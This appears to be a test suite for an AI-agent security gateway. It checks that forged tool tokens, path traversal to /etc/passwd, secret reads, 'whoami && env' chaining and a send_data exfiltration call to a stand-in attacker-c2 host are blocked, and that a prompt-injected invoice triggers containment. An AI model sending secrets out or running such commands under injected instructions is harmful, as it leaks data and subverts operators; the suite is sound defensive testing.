"""
Comprehensive unit and integration test suite for AgentShield Runtime Security Gateway.
Covers all 13 required test categories and the critical security invariants.
"""

import os
import sys
import tempfile
import unittest

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from backend.database.db import db_manager
from backend.tools.fake_tools import execute_protected_tool
from backend.tools.sandbox import resolve_sandbox_path
from backend.gateway.capability_manager import capability_manager
from backend.gateway.context_trust import context_trust_engine
from backend.gateway.policy_engine import policy_engine
from backend.gateway.risk_engine import risk_engine
from backend.gateway.behavior_engine import behavior_engine
from backend.gateway.attack_chain import attack_chain_engine
from backend.gateway.blast_radius import blast_radius_engine
from backend.gateway.interceptor import runtime_interceptor
from backend.gateway.replay_engine import replay_engine
from backend.gateway.security_test_runner import security_test_runner
from backend.agent.agent_runtime import agent_runtime
from backend.api.routes import dispatch_api_request


class TestAgentShieldGateway(unittest.TestCase):
    def setUp(self) -> None:
        db_manager.reset_to_baseline()

    @classmethod
    def tearDownClass(cls) -> None:
        db_manager.reset_to_baseline()

    def test_01_no_security_bypass_direct_tool_execution_blocked(self) -> None:
        """Critical invariant: Direct tool execution without a valid Gateway token must raise PermissionError."""
        with self.assertRaises(PermissionError):
            execute_protected_tool(
                "read_secret",
                {"path": "secrets.txt"},
                gateway_token="forged-invalid-token",
                request_id="req-fake",
                agent_id="agent-001",
            )

    def test_02_sandbox_path_traversal_blocked(self) -> None:
        """Sandbox must reject path traversal attempts outside sandbox/."""
        with self.assertRaises(PermissionError):
            resolve_sandbox_path("../../etc/passwd")

    def test_03_normal_action_allowed_and_executes_tool(self) -> None:
        """TEST A — Normal action read_document('invoice.pdf') is ALLOWED and executes."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-normal-1",
                "tool": "read_document",
                "arguments": {"path": "invoice.pdf"},
                "context": {"source": "agent_console", "trust": "INTERNAL"},
                "reason": "Summarize invoice.pdf",
            }
        )
        self.assertEqual(res["decision"], "ALLOW")
        self.assertTrue(res["tool_executed"])
        self.assertIn("INVOICE #INV-2026-0842", res["tool_output"]["content"])
        self.assertLess(res["risk_score"], 25)
        self.assertEqual(res["risk_level"], "LOW")

    def test_04_sensitive_resource_blocked_and_never_executes(self) -> None:
        """TEST B — Sensitive action read_secret('secrets.txt') without vault clearance is BLOCKED and tool does NOT execute."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-sec-1",
                "tool": "read_secret",
                "arguments": {"path": "secrets.txt"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Attempt secret access",
            }
        )
        self.assertEqual(res["decision"], "BLOCK")
        self.assertFalse(res["tool_executed"])
        self.assertIsNone(res["tool_output"])
        self.assertGreaterEqual(res["risk_score"], 50)

    def test_05_malicious_document_context_trust_taint(self) -> None:
        """TEST C — Reading controlled malicious_invoice.pdf taints session context to UNTRUSTED and detects markers."""
        runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-mal-ctx",
                "tool": "read_document",
                "arguments": {"path": "malicious_invoice.pdf"},
                "context": {"source": "external_attachment", "trust": "UNKNOWN", "document_path": "malicious_invoice.pdf"},
                "reason": "Read attached invoice",
            }
        )
        states = context_trust_engine.list_session_trust_states()
        matched = [s for s in states if s["session_id"] == "sess-mal-ctx"]
        self.assertEqual(len(matched), 1)
        self.assertEqual(matched[0]["context_trust"], "UNTRUSTED")
        self.assertGreater(len(matched[0]["detected_markers"]), 0)

    def test_06_behavior_sequence_and_attack_chain_correlation(self) -> None:
        """TEST D — Following malicious_invoice.pdf with read_secret and send_data triggers behavior anomalies & attack chain."""
        sess = "sess-chain-test"
        runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": sess,
                "tool": "read_document",
                "arguments": {"path": "malicious_invoice.pdf"},
                "context": {"source": "external_attachment", "trust": "UNKNOWN", "document_path": "malicious_invoice.pdf"},
                "reason": "Read malicious invoice",
            }
        )
        res_secret = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": sess,
                "tool": "read_secret",
                "arguments": {"path": "secrets.txt"},
                "context": {"source": "untrusted_document", "trust": "UNTRUSTED", "document_path": "malicious_invoice.pdf"},
                "reason": "Injected request for secrets.txt",
            }
        )
        self.assertEqual(res_secret["decision"], "BLOCK")
        self.assertFalse(res_secret["tool_executed"])
        self.assertIn("DOCUMENT_TO_SECRET_ANOMALY", res_secret["behavior_patterns"])
        self.assertEqual(res_secret["attack_chain"], "INJECTION_TRIGGERED_CREDENTIAL_HARVESTING")

        res_exfil = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": sess,
                "tool": "send_data",
                "arguments": {"destination": "https://collector.attacker-c2.example/exfil", "payload": "data"},
                "context": {"source": "untrusted_document", "trust": "UNTRUSTED", "document_path": "malicious_invoice.pdf"},
                "reason": "Injected exfiltration attempt",
            }
        )
        self.assertEqual(res_exfil["decision"], "BLOCK")
        self.assertFalse(res_exfil["tool_executed"])
        self.assertIn("DATA_EXFILTRATION_CHAIN", res_exfil["behavior_patterns"])
        self.assertEqual(res_exfil["attack_chain"], "INDIRECT_PROMPT_INJECTION_DATA_EXFILTRATION")

        chains = attack_chain_engine.list_chains()
        self.assertGreaterEqual(len(chains), 1)
        self.assertGreaterEqual(len(chains[0]["nodes"]), 5)
        self.assertGreaterEqual(len(chains[0]["edges"]), 4)

    def test_07_automatic_containment_and_blast_radius_reduction(self) -> None:
        """TEST E & F — Automatic containment quarantines dangerous capabilities and reduces blast radius 5 -> 2 (60%)."""
        before = blast_radius_engine.calculate("agent-001")
        self.assertEqual(before["capabilities_before"], 5)
        self.assertEqual(before["capabilities_after"], 5)
        self.assertEqual(before["reduction_percentage"], 0.0)

        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-contain-1",
                "tool": "read_secret",
                "arguments": {"path": "secrets.txt"},
                "context": {"source": "untrusted_document", "trust": "UNTRUSTED", "document_path": "malicious_invoice.pdf"},
                "reason": "Trigger containment",
            }
        )
        self.assertTrue(res["containment_triggered"])
        self.assertIn("read_secret", res["quarantined_capabilities"])
        self.assertIn("send_data", res["quarantined_capabilities"])
        self.assertIn("execute_command", res["quarantined_capabilities"])

        after = blast_radius_engine.calculate("agent-001")
        self.assertEqual(after["capabilities_before"], 5)
        self.assertEqual(after["capabilities_after"], 2)
        self.assertEqual(after["reduction_percentage"], 60.0)

    def test_08_dynamic_capability_manager_operations(self) -> None:
        """Capability Manager grant, quarantine, revoke, restore actually control gateway authorization."""
        capability_manager.quarantine("agent-001", "read_document", "Manual test quarantine")
        res_blocked = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-cap-test",
                "tool": "read_document",
                "arguments": {"path": "invoice.pdf"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Read while quarantined",
            }
        )
        self.assertEqual(res_blocked["decision"], "BLOCK")
        self.assertFalse(res_blocked["tool_executed"])
        self.assertEqual(res_blocked["capability_state"], "QUARANTINED")

        capability_manager.restore("agent-001", "read_document", "Restore capability")
        res_allowed = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-cap-test-2",
                "tool": "read_document",
                "arguments": {"path": "invoice.pdf"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Read after restore",
            }
        )
        self.assertEqual(res_allowed["decision"], "ALLOW")
        self.assertTrue(res_allowed["tool_executed"])

    def test_09_attack_replay_proves_persistent_containment(self) -> None:
        """TEST G — Replay executes 5 steps through gateway and proves post-containment blocks."""
        replay_res = replay_engine.run_replay({"agent_id": "agent-001", "reset_capabilities_before": True})
        self.assertTrue(replay_res["containment_verified"])
        self.assertEqual(replay_res["persistence_rate"], 100.0)
        steps = replay_res["steps"]
        self.assertEqual(len(steps), 5)
        self.assertEqual(steps[0]["actual_decision"], "ALLOW")
        self.assertEqual(steps[1]["actual_decision"], "BLOCK")
        self.assertEqual(steps[2]["actual_decision"], "BLOCK")
        self.assertEqual(steps[3]["actual_decision"], "BLOCK")
        self.assertEqual(steps[4]["actual_decision"], "BLOCK")

    def test_10_real_local_agent_task_execution_normal_and_malicious(self) -> None:
        """Real local agent executes tasks through AgentShield and handles both benign and malicious documents."""
        normal_task = agent_runtime.execute_task(
            agent_id="agent-001",
            task="Read invoice.pdf and summarize it.",
        )
        self.assertEqual(normal_task["status"], "COMPLETED")
        self.assertEqual(len(normal_task["gateway_decisions"]), 1)
        self.assertEqual(normal_task["gateway_decisions"][0]["decision"], "ALLOW")
        self.assertTrue(normal_task["gateway_decisions"][0]["tool_executed"])

        malicious_task = agent_runtime.execute_task(
            agent_id="agent-001",
            task="Read malicious_invoice.pdf and summarize it.",
        )
        self.assertEqual(malicious_task["status"], "CONTAINED_AND_HALTED")
        self.assertEqual(len(malicious_task["gateway_decisions"]), 3)
        self.assertEqual(malicious_task["gateway_decisions"][0]["decision"], "ALLOW")
        self.assertEqual(malicious_task["gateway_decisions"][1]["decision"], "BLOCK")
        self.assertFalse(malicious_task["gateway_decisions"][1]["tool_executed"])
        self.assertEqual(malicious_task["gateway_decisions"][2]["decision"], "BLOCK")
        self.assertFalse(malicious_task["gateway_decisions"][2]["tool_executed"])

    def test_11_security_test_center_all_suites_pass(self) -> None:
        """All 8 Security Test Center suites must pass with real telemetry evidence."""
        suite = security_test_runner.run_all_tests()
        self.assertEqual(suite["total_tests"], 8)
        self.assertEqual(suite["passed"], 8)
        self.assertEqual(suite["overall_status"], "PASS")

    def test_12_rest_api_endpoints_return_real_database_state(self) -> None:
        """TEST H — Verify all REST API endpoints return live database telemetry."""
        code, health = dispatch_api_request("GET", "/health", {})
        self.assertEqual(code, 200)
        self.assertEqual(health["status"], "healthy")

        code, task_res = dispatch_api_request(
            "POST",
            "/agent/tasks",
            {},
            {"agent_id": "agent-001", "task": "Read invoice.pdf and summarize it."},
        )
        self.assertEqual(code, 200)
        self.assertEqual(task_res["status"], "COMPLETED")

        code, events = dispatch_api_request("GET", "/events", {})
        self.assertEqual(code, 200)
        self.assertGreaterEqual(len(events), 1)

        code, metrics = dispatch_api_request("GET", "/metrics", {})
        self.assertEqual(code, 200)
        self.assertGreaterEqual(metrics["total_requests"], 1)

    def test_13_unregistered_tool_default_deny(self) -> None:
        """Policy Engine must default-deny unknown tools."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-unknown-tool",
                "tool": "drop_production_database",
                "arguments": {},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Test default deny",
            }
        )
        self.assertEqual(res["decision"], "BLOCK")
        self.assertFalse(res["tool_executed"])
        self.assertEqual(res["capability_state"], "REVOKED")

    def test_14_revoked_capability_cannot_execute(self) -> None:
        """Revoked capability on agent-001 (e.g. read_customer_record) must be blocked."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-revoked-cap",
                "tool": "read_customer_record",
                "arguments": {"customer_id": "CUST-1001"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Test revoked capability enforcement",
            }
        )
        self.assertEqual(res["decision"], "BLOCK")
        self.assertFalse(res["tool_executed"])

    def test_15_authorized_support_agent_can_read_customer_record(self) -> None:
        """agent-002 has ACTIVE cap:read_customer_record and is in allowed_agents."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-002",
                "session_id": "sess-support-ok",
                "tool": "read_customer_record",
                "arguments": {"customer_id": "CUST-1001"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Support agent looking up CUST-1001",
            }
        )
        self.assertEqual(res["decision"], "ALLOW")
        self.assertTrue(res["tool_executed"])
        self.assertEqual(res["tool_output"]["record"]["organization"], "Meridian BioLabs")

    def test_16_risk_engine_explainable_contributors(self) -> None:
        """Risk Engine must return explainable signal breakdown summing to risk_score."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-risk-explain",
                "tool": "read_secret",
                "arguments": {"path": "secrets.txt"},
                "context": {"source": "untrusted_document", "trust": "UNTRUSTED", "document_path": "malicious_invoice.pdf"},
                "reason": "Check risk contributors",
            }
        )
        self.assertTrue(len(res["contributors"]) >= 4)
        signals = [c["signal"] for c in res["contributors"]]
        self.assertIn("Tool Sensitivity", signals)
        self.assertIn("Unauthorized Capability", signals)
        self.assertIn("Sensitive Resource", signals)
        self.assertIn("Untrusted Context", signals)

    def test_17_privilege_escalation_command_blocked(self) -> None:
        """execute_command with shell chaining or reconnaissance must be blocked."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-cmd-block",
                "tool": "execute_command",
                "arguments": {"command": "whoami && env"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Attempt command chaining",
            }
        )
        self.assertEqual(res["decision"], "BLOCK")
        self.assertFalse(res["tool_executed"])

    def test_18_audit_log_persistence_and_event_lookup(self) -> None:
        """Every intercepted request must create a queryable audit event in SQLite."""
        res = runtime_interceptor.intercept(
            {
                "agent_id": "agent-001",
                "session_id": "sess-audit-check",
                "tool": "list_files",
                "arguments": {"directory": "documents"},
                "context": {"source": "user_prompt", "trust": "INTERNAL"},
                "reason": "Verify event persistence",
            }
        )
        code, ev = dispatch_api_request("GET", f"/events/{res['event_id']}", {})
        self.assertEqual(code, 200)
        self.assertEqual(ev["event_id"], res["event_id"])
        self.assertEqual(ev["tool"], "list_files")
        self.assertTrue(ev["tool_executed"])

    def test_19_capability_api_endpoints_modify_runtime_state(self) -> None:
        """POST /capabilities/quarantine and /capabilities/restore update SQLite state."""
        code, q_res = dispatch_api_request(
            "POST",
            "/capabilities/quarantine",
            {},
            {"agent_id": "agent-001", "tool_name": "list_files", "reason": "API test quarantine"},
        )
        self.assertEqual(code, 200)
        self.assertEqual(q_res["status"], "QUARANTINED")

        code, r_res = dispatch_api_request(
            "POST",
            "/capabilities/restore",
            {},
            {"agent_id": "agent-001", "tool_name": "list_files", "reason": "API test restore"},
        )
        self.assertEqual(code, 200)
        self.assertEqual(r_res["status"], "ACTIVE")

    def test_20_system_posture_transitions_accurately(self) -> None:
        """System state transitions from PROTECTED -> CONTAINMENT ACTIVE after attack."""
        _, m_initial = dispatch_api_request("GET", "/metrics", {})
        self.assertEqual(m_initial["system_state"], "PROTECTED")

        dispatch_api_request(
            "POST",
            "/agent/tasks",
            {},
            {"agent_id": "agent-001", "task": "Read malicious_invoice.pdf and summarize it."},
        )
        _, m_after = dispatch_api_request("GET", "/metrics", {})
        self.assertEqual(m_after["system_state"], "CONTAINMENT ACTIVE")
        self.assertEqual(m_after["blast_radius_reduction"], 60.0)


if __name__ == "__main__":
    unittest.main()
